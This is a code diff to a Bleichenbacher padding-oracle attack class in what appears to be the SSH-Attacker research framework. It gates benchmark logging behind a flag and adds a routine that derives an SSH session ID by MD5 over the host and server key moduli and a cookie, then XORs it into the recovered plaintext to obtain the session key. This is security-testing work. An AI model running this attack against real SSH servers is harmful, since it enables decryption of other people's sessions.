@@ -9,6 +9,7 @@ package de.rub.nds.sshattacker.attacks.impl;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
+import com.google.common.primitives.Bytes;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
 import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
@@ -27,8 +28,11 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Random;
 import org.apache.logging.log4j.LogManager;
@@ -143,16 +147,18 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     @Override
     public void executeAttack() {
 
-        try {
-            String str = "Starting.";
-            File output_File = new File("benchmark_results.txt");
-            FileOutputStream outputStream = new FileOutputStream(output_File, true);
-            byte[] strToBytes = str.getBytes();
-            outputStream.write(strToBytes);
+        if (config.isBenchmark()) {
+            try {
+                String str = "Starting.";
+                File output_File = new File("benchmark_results.txt");
+                FileOutputStream outputStream = new FileOutputStream(output_File, true);
+                byte[] strToBytes = str.getBytes();
+                outputStream.write(strToBytes);
 
-            outputStream.close();
-        } catch (IOException e) {
-            throw new RuntimeException(e);
+                outputStream.close();
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
         }
 
         /*if (!isVulnerable()) {
@@ -236,7 +242,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 attacker.getCounterInnerBleichenbacher(),
                 attacker.getCounterOuterBleichenbacher());
         BigInteger solution = attacker.getSolution();
-        CONSOLE.info("Decoded Solution: " + solution);
 
         // Trasfer big-Integer back to byte-array, remove leading 0 if present.
         byte[] solutionByteArray = solution.toByteArray();
@@ -246,22 +251,75 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             solutionByteArray = tmp;
         }
 
-        try {
-            String str =
-                    String.format(
-                            "Results: Plaintext: %s; Time: %d ms; Inner-Tries: %d; Outer-Tries: %d ",
-                            ArrayConverter.bytesToHexString(solutionByteArray),
-                            timeElapsed,
-                            attacker.getCounterInnerBleichenbacher(),
-                            attacker.getCounterOuterBleichenbacher());
-            File output_File = new File("benchmark_results.txt");
-            FileOutputStream outputStream = new FileOutputStream(output_File, true);
-            byte[] strToBytes = str.getBytes();
-            outputStream.write(strToBytes);
+        CONSOLE.info("Decoded Solution: " + ArrayConverter.bytesToHexString(solutionByteArray));
 
-            outputStream.close();
-        } catch (IOException e) {
+        if (config.getCookie() != null) {
+            byte[] cookieBytes = config.getCookie().getBytes();
+            byte[] sessionID = calculateSessionID(cookieBytes);
+            int i = 0;
+            for (byte sesseionByte : sessionID) {
+                solutionByteArray[i] = (byte) (sesseionByte ^ solutionByteArray[i++]);
+            }
+        }
+
+        if (config.isBenchmark()) {
+            try {
+                String str =
+                        String.format(
+                                "{"
+                                        + "  \"Plaintext\": \"%s\","
+                                        + "  \"Ciphertext\": \"%s\","
+                                        + "  \"Time\": \"%d\",\n"
+                                        + "  \"Inner-Tries\": \"%d\","
+                                        + "  \"Outer-Tries\": \"%d\","
+                                        + "  \"serverkey_lenght\": \"%d\","
+                                        + "  \"hostkey_lenght\": \"%d\""
+                                        + "}",
+                                ArrayConverter.bytesToHexString(solutionByteArray),
+                                ArrayConverter.bytesToHexString(encryptedSecret),
+                                timeElapsed,
+                                attacker.getCounterInnerBleichenbacher(),
+                                attacker.getCounterOuterBleichenbacher(),
+                                serverPublicKey.getModulus().bitLength(),
+                                hostPublicKey.getModulus().bitLength());
+                File output_File = new File("benchmark_results.txt");
+                FileOutputStream outputStream = new FileOutputStream(output_File, true);
+                byte[] strToBytes = str.getBytes();
+                outputStream.write(strToBytes);
+
+                outputStream.close();
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    private byte[] calculateSessionID(byte[] cookie) {
+        byte[] serverModulus;
+        byte[] hostModulus;
+
+        serverModulus = serverPublicKey.getModulus().toByteArray();
+        hostModulus = hostPublicKey.getModulus().toByteArray();
+
+        // Remove sign-byte if present
+        if (hostModulus[0] == 0) {
+            hostModulus = Arrays.copyOfRange(hostModulus, 1, hostModulus.length);
+        }
+        if (serverModulus[0] == 0) {
+            serverModulus = Arrays.copyOfRange(serverModulus, 1, serverModulus.length);
+        }
+
+        MessageDigest md = null;
+        try {
+            md = MessageDigest.getInstance("MD5");
+        } catch (NoSuchAlgorithmException e) {
             throw new RuntimeException(e);
         }
+        md.update(Bytes.concat(hostModulus, serverModulus, cookie));
+        // md.update(Bytes.concat(serverModulus, hostModulus, cookie));
+        byte[] sessionID = md.digest();
+        LOGGER.debug("Session-ID {}", ArrayConverter.bytesToHexString(sessionID));
+
+        return sessionID;
     }
 }
